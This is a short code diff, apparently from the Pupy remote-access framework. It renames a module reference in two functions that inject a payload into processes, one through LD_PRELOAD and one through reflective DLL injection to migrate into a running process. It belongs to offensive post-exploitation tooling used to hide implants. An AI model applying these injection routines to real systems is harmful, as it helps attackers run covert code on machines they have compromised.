@@ -81,7 +81,7 @@ def wait_connect(module, pid, timeout=10):
 def ld_preload(module, command, wait_thread=False, keep=False, debug=False, from_payload=None):
     payload = get_payload(module, debug, from_payload=from_payload)
 
-    pid = module.client.conn.modules['pupy'].ld_preload_inject_dll(
+    pid = module.client.conn.modules['pupy.agent'].ld_preload_inject_dll(
         command, payload, wait_thread
     )
 
@@ -100,7 +100,7 @@ def ld_preload(module, command, wait_thread=False, keep=False, debug=False, from
 def migrate(module, pid, keep=False, timeout=10, debug=False, from_payload=None):
     payload = get_payload(module, debug, from_payload=from_payload)
 
-    r = module.client.conn.modules['pupy'].reflective_inject_dll(
+    r = module.client.conn.modules['pupy.agent'].reflective_inject_dll(
         pid, payload
     )
 
